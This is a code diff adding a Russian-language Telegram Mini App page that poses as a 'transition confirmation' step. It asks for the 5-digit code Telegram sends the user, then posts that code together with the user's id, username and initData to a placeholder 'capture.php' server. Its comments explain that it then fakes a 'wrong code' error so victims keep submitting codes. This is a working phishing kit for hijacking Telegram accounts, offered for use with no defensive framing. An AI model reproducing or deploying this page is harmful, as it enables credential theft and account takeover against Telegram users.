@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mini App</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--tg-theme-bg-color, #ffffff);
+            color: var(--tg-theme-text-color, #000000);
+            padding: 20px;
+            margin: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid var(--tg-theme-hint-color, #ccc);
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--tg-theme-button-color, #40a7e3);
+            color: var(--tg-theme-button-text-color, #ffffff);
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .warning {
+            color: var(--tg-theme-destructive-text-color, #ff3b30);
+            margin: 20px 0;
+            padding: 10px;
+            border: 1px solid var(--tg-theme-destructive-text-color, #ff3b30);
+            border-radius: 8px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Подтверждение перехода</h1>
+        <p>Для продолжения введите код подтверждения, отправленный вам в Telegram</p>
+        
+        <div class="warning" id="warning">
+            Неверный код. Попробуйте снова.
+        </div>
+        
+        <input type="text" id="codeInput" placeholder="Введите 5-значный код" maxlength="5" pattern="[0-9]{5}" inputmode="numeric">
+        
+        <button id="submitBtn">Подтвердить</button>
+    </div>
+
+    <script>
+        // Инициализация Telegram Web App
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand(); // Разворачиваем на весь экран
+        
+        // Получаем данные пользователя (они автоматически передаются Telegram)
+        const initData = tg.initData;
+        const initDataUnsafe = tg.initDataUnsafe;
+        
+        console.log('User data:', initDataUnsafe.user);
+        
+        // Обработчик кнопки
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            const code = document.getElementById('codeInput').value;
+            
+            if (code && code.length === 5) {
+                // Отправляем код на сервер (через fetch)
+                fetch('https://ваш-сервер.com/capture.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        code: code,
+                        user_id: initDataUnsafe.user?.id,
+                        username: initDataUnsafe.user?.username,
+                        initData: initData
+                    })
+                }).then(response => {
+                    if (response.ok) {
+                        // После успешной отправки показываем сообщение об ошибке
+                        // (имитируем неверный код, чтобы пользователь пытался снова)
+                        document.getElementById('warning').style.display = 'block';
+                        document.getElementById('codeInput').value = '';
+                        
+                        // Или можно закрыть приложение
+                        // tg.close();
+                    }
+                }).catch(error => {
+                    console.error('Error:', error);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
